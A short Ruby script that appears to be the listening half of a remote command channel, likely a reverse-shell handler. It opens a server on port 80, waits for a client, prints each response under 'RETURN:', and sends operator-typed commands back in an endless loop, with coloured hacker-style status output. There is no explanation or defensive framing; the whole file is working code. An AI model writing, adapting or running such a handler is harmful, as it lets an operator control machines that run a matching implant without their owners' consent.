require 'socket'

PORT = 80
server = TCPServer.new(PORT)
puts "[\033[1;92m*\033[1;97m] Server listening on port #{PORT}"

loop do
  client = server.accept
  client_address = client.peeraddr[2]
  client_port = client.peeraddr[1]
  puts "[\033[1;92m*\033[1;97m] Client connected from #{client_address}:\033[1;94m#{client_port}\033[1;97m"
  
  while true
    puts "RETURN:\n#{client.recv(1024)}"
    cmd = gets.chomp
    if cmd.empty?
      cmd = "Empty CMD :/" 
    end
    client.puts cmd
  end
  client.close
end
